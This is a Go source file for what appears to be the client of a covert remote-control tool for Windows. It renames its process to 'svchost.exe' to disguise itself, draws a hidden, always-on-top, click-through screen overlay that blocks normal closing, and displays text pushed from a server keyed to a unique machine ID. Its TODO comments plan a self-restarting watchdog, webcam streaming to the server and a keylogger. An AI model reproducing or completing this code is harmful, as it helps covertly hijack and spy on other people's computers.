package main

//TODO: REFAC1TOR EVERYTHING
/*
TODO:
	1 -implement a checker that checks if app has gone silent and make app check if checker is silent
		if either are silent then start it
	2 -Play Audio file sent by server
	3 - display images sent by server
	4 - display videos sent by server
	5 - Access Webcam and stream to server
	6 - keylogger and send data to server
*/

import (
	"bytes"
	_ "embed"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"reflect"
	"runtime"
	"syscall"
	"unsafe"

	"github.com/Xart3mis/GoHkar/lib/bundles"
	"github.com/Xart3mis/GoHkar/lib/reg"
	"github.com/go-gl/gl/all-core/gl"
	"github.com/go-gl/glfw/v3.3/glfw"
	"github.com/nullboundary/glfont"
	"golang.design/x/hotkey"
)

type ClientData struct {
	ShouldUpdate bool   `json:"ClientShouldUpdate"`
	OnScreenText string `json:"ClientOnScreenText"`
}

type ClientProductId struct {
	ProductId string `json:"ProductId"`
}

var u32dll, _ = syscall.LoadLibrary("user32.dll")
var ShowWindow, _ = syscall.GetProcAddress(u32dll, "ShowWindow")
var SetWindowPos, _ = syscall.GetProcAddress(u32dll, "SetWindowPos")
var SetWindowLongPtrW, _ = syscall.GetProcAddress(u32dll, "SetWindowLongPtrW")

var HWND_TOPMOST int = -1
var SWP_NOSIZE int = 0x0001
var SWP_NOMOVE int = 0x0002
var TOPMOST_FLAGS int = SWP_NOMOVE | SWP_NOSIZE

var SW_HIDE int = 0
var GWL_EXSTYLE int = -20
var WS_EX_TOOLWINDOW uint = 0x00000080
var WS_EX_LAYERED uint = 0x80000
var WS_EX_TRANSPARENT uint = 0x20

var clients map[string]ClientData = make(map[string]ClientData)

func init() {
	runtime.LockOSThread()
}

func main() {
	SetProcessName("svchost.exe")
	bundles.WriteFiraCodeNerd()
	if err := glfw.Init(); err != nil {
		panic(err)
	}

	defer glfw.Terminate()

	mode := glfw.GetPrimaryMonitor().GetVideoMode()

	glfw.WindowHint(glfw.Resizable, glfw.True)
	glfw.WindowHint(glfw.ContextVersionMajor, 3)
	glfw.WindowHint(glfw.ContextVersionMinor, 2)
	glfw.WindowHint(glfw.OpenGLProfile, glfw.OpenGLCoreProfile)
	glfw.WindowHint(glfw.OpenGLForwardCompatible, glfw.True)

	glfw.WindowHint(glfw.RedBits, mode.RedBits)
	glfw.WindowHint(glfw.GreenBits, mode.GreenBits)
	glfw.WindowHint(glfw.BlueBits, mode.BlueBits)
	glfw.WindowHint(glfw.RefreshRate, mode.RefreshRate)

	glfw.WindowHint(glfw.TransparentFramebuffer, glfw.True)
	glfw.WindowHint(glfw.AutoIconify, glfw.False)
	glfw.WindowHint(glfw.Floating, glfw.True)
	glfw.WindowHint(glfw.Visible, glfw.False)

	window, err := glfw.CreateWindow(mode.Width, mode.Height, "Testing", nil, nil)
	if err != nil {
		panic(err)
	}

	monitorX, monitorY := glfw.GetPrimaryMonitor().GetPos()
	window.SetPos(monitorX, monitorY)

	window.SetAttrib(glfw.Resizable, glfw.False)
	window.SetAttrib(glfw.Decorated, glfw.False)

	go func() {
		hk := hotkey.New([]hotkey.Modifier{hotkey.ModCtrl, hotkey.ModAlt, hotkey.ModShift}, hotkey.KeyX)
		if err := hk.Register(); err != nil {
			panic("hotkey registration failed")
		}

		for range hk.Keydown() {
			window.SetShouldClose(true)
		}
	}()

	window.MakeContextCurrent()
	glfw.SwapInterval(1)

	if err := gl.Init(); err != nil {
		panic(err)
	}

	gl.Enable(gl.DEPTH_TEST)
	gl.DepthFunc(gl.LESS)
	gl.ClearColor(0.0, 0.0, 0.0, 0.0)

	font, err := glfont.LoadFont("FiraCodeNerd.ttf", int32(52), mode.Width, mode.Height)
	if err != nil {
		log.Panicf("LoadFont: %v", err)
	}

	hwnd := window.GetWin32Window()
	window.Show()

	syscall.SyscallN(SetWindowPos, uintptr(unsafe.Pointer(hwnd)), uintptr(HWND_TOPMOST), 0, 0, 0, 0, uintptr(TOPMOST_FLAGS))

	syscall.SyscallN(ShowWindow, uintptr(unsafe.Pointer(hwnd)), uintptr(SW_HIDE))
	syscall.SyscallN(SetWindowLongPtrW, uintptr(unsafe.Pointer(hwnd)), uintptr(GWL_EXSTYLE), uintptr(WS_EX_TOOLWINDOW|WS_EX_TRANSPARENT|WS_EX_LAYERED))
	syscall.SyscallN(ShowWindow, uintptr(unsafe.Pointer(hwnd)), uintptr(syscall.SW_SHOW))

	window.SetOpacity(0.8)
	window.SetCloseCallback(CloseCallback)

	pid := ClientProductId{ProductId: reg.GetUniqueSystemId()}
	data, _ := json.Marshal(pid)

	for !window.ShouldClose() {
		GetOnScreenText(data)
		Draw(font, mode, pid, window, clients[pid.ProductId].ShouldUpdate)
	}
}

func GetOnScreenText(data []byte) error {
	resp, err := http.Post("http://localhost:5050/", "application/json", bytes.NewBuffer(data))
	if err != nil {
		return err
	}

	defer resp.Body.Close()
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return err
	}

	fmt.Println(string(body))
	err = json.Unmarshal(body, &clients)
	if err != nil {
		return err
	}

	return nil
}

func Draw(font *glfont.Font, mode *glfw.VidMode, pid ClientProductId, window *glfw.Window, update bool) {
	gl.Clear(gl.COLOR_BUFFER_BIT | gl.DEPTH_BUFFER_BIT)
	gl.ClearColor(0, 0, 0, 0)

	if update {
		font.SetColor(1.0, 1.0, 1.0, 1.0)
		font.Printf(float32(mode.Width)/2-font.Width(1.0, clients[pid.ProductId].OnScreenText)/2,
			float32(mode.Height)/2, 1.0, clients[pid.ProductId].OnScreenText)
	}

	window.SwapBuffers()
	glfw.PollEvents()
}

func CloseCallback(w *glfw.Window) {
	w.SetShouldClose(false)
}

func SetProcessName(name string) error {
	argv0str := (*reflect.StringHeader)(unsafe.Pointer(&os.Args[0]))
	argv0 := (*[1 << 30]byte)(unsafe.Pointer(argv0str.Data))[:argv0str.Len]

	n := copy(argv0, name)
	if n < len(argv0) {
		argv0[n] = 0
	}

	return nil
}
